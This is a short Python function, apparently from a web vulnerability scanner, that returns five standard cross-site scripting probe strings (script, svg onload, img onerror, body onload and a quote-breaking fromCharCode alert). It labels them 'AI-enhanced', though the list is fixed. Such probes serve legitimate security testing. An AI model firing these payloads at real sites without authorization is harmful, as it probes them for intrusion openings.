def generate_payloads():
    print("[+] Generating AI-enhanced payloads...")
    return [
        "<script>alert(1)</script>",
        "\"><svg onload=alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>"
    ]
